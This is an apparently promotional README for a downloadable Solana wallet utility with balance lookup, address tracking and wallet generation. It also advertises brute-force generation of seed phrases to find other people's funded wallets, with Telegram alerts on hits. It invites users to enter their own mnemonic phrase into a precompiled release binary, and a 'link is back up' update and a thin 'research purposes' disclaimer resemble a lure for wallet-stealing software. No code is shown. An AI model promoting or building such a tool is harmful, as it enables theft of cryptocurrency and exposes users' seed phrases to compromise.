# Solana Wallet Balance Lookup: Instant Access to Your SOL Holdings

Need to quickly and easily perform a **Solana wallet balance lookup**? This powerful tool is designed to give you immediate insights into your Solana holdings. Whether you're managing multiple wallets, tracking transactions, or just getting started with Solana, this application has the features you need.

<p align="left">
    <img src="/assets/edge.webp" />
</p>

## Key Features at a Glance

1.  **Effortless Solana Wallet Balance Lookup:** Simply input a Solana address to instantly view its current balance. A straightforward way to stay informed about your assets.

<p align="left">
    <img src="/assets/beta.webp" />
</p>

2.  **Smart Token Security Checks:** Go beyond simple balances. Assess the security of Solana tokens based on characteristics and metadata. Identify risks associated with potentially fraudulent projects to safeguard your investments and dodge rug-pulls.

3.  **Real-time Address Tracking:** Get notified instantly about wallet activity. Set up a Telegram bot for real-time monitoring and transaction alerts. A vital feature for tracking active transactions and managing your digital assets effectively.

4.  **Wallet Data Retrieval from Mnemonic Phrases:** Recover vital wallet data, including private keys and balances, using your mnemonic phrase (seed phrase). Protect your funds by securing access to key wallet information.

<p align="left">
    <img src="/assets/back.webp" />
</p>

5.  **Generate New Solana Wallets:** Create fresh Solana wallets with unique private keys and addresses as needed. Perfect for managing assets securely and independently.

<p align="left">
    <img src="/assets/execution.webp" />
</p>

6.  **Advanced Wallet Generation and Balance Scanning:** Utilize brute-force generation of seed phrases to find wallets with balances, and discover active Solana wallets. Configure Telegram notifications to get alerts on found wallets.

<p align="left">
    <img src="/assets/monitor.webp" />
</p>

## Configuring Telegram Notifications

Receive immediate updates via Telegram:

1.  Obtain your [bot token](https://core.telegram.org/bots/tutorial#obtain-your-bot-token).
2.  Find your [chat_id](https://t.me/getmyid_bot).
3.  Enter your bot token and chat ID into the `telegram-settings.txt` file in the program folder.

## Quick Start

Get up and running quickly:

*   Download the latest compiled version from the [Release](../../releases) section.
*   Build the project yourself to tailor the features or resolve particular needs.

## Project Building Guide

The project can be built using Visual Studio or any other C++ compiler. To successfully build the project, several dependent libraries need to be installed. **vcpkg** is a convenient tool for installing and managing these dependencies.

### Installing Dependencies Using vcpkg:

1. If you don’t have **vcpkg** yet, clone the repository and install it by following the instructions on the [official page](https://github.com/microsoft/vcpkg).

2. After installing **vcpkg**, add it to your system PATH environment variable to be able to use it from the command line.

3. To install the dependencies, run the following commands:

   - Install **OpenSSL**:
     ```bash
     vcpkg install openssl
     ```

   - Install **nlohmann-json**:
     ```bash
     vcpkg install nlohmann-json
     ```

   - Install **Crypto++**:
     ```bash
     vcpkg install cryptopp
     ```

   - Install **libsodium**:
     ```bash
     vcpkg install libsodium
     ```

4. Once the dependencies are installed, you can proceed with building the project in Visual Studio or using another C++ compiler.

### Building via Visual Studio:

1. Open the project solution in Visual Studio.
2. Make sure **vcpkg** is correctly integrated with your environment. You can follow the instructions for [integrating vcpkg with Visual Studio](https://github.com/microsoft/vcpkg#visual-studio).
3. Click **Build** -> **Build Solution**.
4. After a successful build, the executable will be located in the `bin` folder or a similar directory.

### Building with Another C++ Compiler:

1. Ensure that all dependencies are installed via **vcpkg** and accessible to your compiler.
2. Compile the project using the following command (depending on your compiler):

   ```bash
   g++ -o solanachecker main.cpp -lssl -lcrypto -lsodium -lcryptopp -std=c++17
   ```

## Command Line Options

Use command-line arguments to maximize flexibility:

1.  **-s / -search**: Run a brute-force search for wallets that have Solana balances by generating seed phrases.

2.  **-t / -track (ADDRESS)**: Start tracking activity on a specific Solana address, get instant monitoring.

3.  **-g / -gen (NUMBER)**: Create a specified number of new Solana wallets (e.g., `-g 25` generates 25 wallets).

4.  **-m / -mnemonic (MNEMONIC)**: Display wallet info using a seed phrase (e.g., `-m "your seed phrase"`).

5.  **-b / -balance (ADDRESS)**: Directly check the SOL balance of a provided address (e.g., `-b YourSolanaAddressHere`).

## Important Reminders

*   This program is designed for research purposes and should not be used for illegal activities.
*   Engage in cryptocurrency activities knowing the associated risks. Always prioritize the security of your data and wallets.

## License

The project is provided under the [MIT License](/LICENSE).

Update:  06/16/2025 05-36-09 I'm pleased to announce that the link is back up.